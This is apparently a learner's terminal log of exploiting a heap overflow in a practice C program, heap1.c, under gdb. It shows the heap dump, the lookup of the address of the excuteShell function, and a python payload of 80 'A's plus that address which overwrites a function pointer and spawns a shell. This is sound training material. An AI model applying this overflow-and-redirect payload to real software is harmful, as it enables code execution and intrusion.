@@ -1,0 +1,161 @@
+gcc -g heap1.c -o heap1
+heap1.c: In function ‘excuteShell’:
+heap1.c:19:1: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
+ execve(name[0],name,NULL);
+ ^~~~~~
+heap1.c: In function ‘main’:
+heap1.c:34:6: warning: assignment from incompatible pointer type [-Wincompatible-pointer-types]
+ f->fp=Failed;
+      ^
+
+
+ gdb heap1
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from heap1...done.
+(gdb) l
+18	name[1]=NULL;
+19	execve(name[0],name,NULL);
+20	}
+21	
+22	void Failed()
+23	{
+24	printf("You failed to exploit the heap\n");
+25	}
+26	
+27	int main(int argc,char **argv)
+(gdb) 
+28	{
+29	struct data *d;
+30	struct fp *f;
+31	
+32	d=malloc(sizeof(struct data));
+33	f=malloc(sizeof(struct fp));
+34	f->fp=Failed;
+35	strcpy(d->name,argv[1]);
+36	f->fp();
+37	}
+
+
+
+(gdb) b 37
+Breakpoint 1 at 0x702: file heap1.c, line 37.
+
+
+
+
+(gdb) r aaaa
+Starting program: /home/gigi/Desktop/heap1 aaaa
+You failed to exploit the heap
+
+Breakpoint 1, main (argc=2, argv=0xbffff304) at heap1.c:37
+37	}
+
+
+(gdb) info proc map
+process 6506
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	  0x400000   0x401000     0x1000        0x0 /home/gigi/Desktop/heap1
+	  0x401000   0x402000     0x1000        0x0 /home/gigi/Desktop/heap1
+	  0x402000   0x403000     0x1000     0x1000 /home/gigi/Desktop/heap1
+	  0x403000   0x425000    0x22000        0x0 [heap]
+	0xb7de2000 0xb7fb7000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
+	0xb7fb7000 0xb7fb8000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
+	0xb7fb8000 0xb7fba000     0x2000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
+	0xb7fba000 0xb7fbb000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
+	0xb7fbb000 0xb7fbe000     0x3000        0x0 
+	0xb7fd2000 0xb7fd4000     0x2000        0x0 
+	0xb7fd4000 0xb7fd7000     0x3000        0x0 [vvar]
+	0xb7fd7000 0xb7fd8000     0x1000        0x0 [vdso]
+	0xb7fd8000 0xb7ffe000    0x26000        0x0 /lib/i386-linux-gnu/ld-2.27.so
+	0xb7ffe000 0xb7fff000     0x1000    0x25000 /lib/i386-linux-gnu/ld-2.2---Type <return> to continue, or q <return> to quit---q
+Quit
+
+
+
+(gdb) x/22000x 0x403000
+0x403000:	0x00000000	0x00000000	0x00000000	0x00000151
+0x403010:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403040:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403070:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403080:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403090:	0x00000000	0x00000000	0x00000000	0x00000000
+0x4030a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x4030b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x4030c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x4030d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x4030e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x4030f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403100:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403110:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403120:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403130:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403140:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403150:	0x00000000	0x00000000	0x00000000	0x00000051
+0x403160:	0x61616161	0x00000000	0x00000000	0x00000000
+---Type <return> to continue, or q <return> to quit---
+0x403170:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403180:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403190:	0x00000000	0x00000000	0x00000000	0x00000000
+0x4031a0:	0x00000000	0x00000000	0x00000000	0x00000011
+0x4031b0:	0x00400668	0x00000000	0x00000000	0x00000411
+0x4031c0:	0x20756f59	0x6c696166	0x74206465	0x7865206f
+0x4031d0:	0x696f6c70	0x68742074	0x65682065	0x000a7061
+0x4031e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x4031f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403200:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403210:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403220:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403230:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403240:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403250:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403260:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403270:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403280:	0x00000000	0x00000000	0x00000000	0x00000000
+0x403290:	0x00000000	0x00000000	0x00000000	0x00000000
+0x4032a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x4032b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x4032c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x4032d0:	0x00000000	0x00000000	0x00000000	0x00000000
+---Type <return> to continue, or q <return> to quit---q
+Quit
+
+
+
+
+(gdb) print &Failed
+$1 = (void (*)()) 0x400668 <Failed>
+
+
+(gdb) print &excuteShell
+$2 = (void (*)()) 0x40060d <excuteShell>
+
+
+(gdb)  run `python -c "print 'A'*80 + '\x0d\x06\x40\x00'"`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/gigi/Desktop/heap1 `python -c "print 'A'*80 + '\x0d\x06\x40\x00'"`
+/bin/bash: warning: command substitution: ignored null byte in input
+process 6522 is executing new program: /bin/dash
+Error in re-setting breakpoint 1: No source file named /home/gigi/Desktop/heap1.c.
+$ ls
+a.out  heap0  heap0.c  heap1  heap1.c  steps_buffer1.txt
+$ 
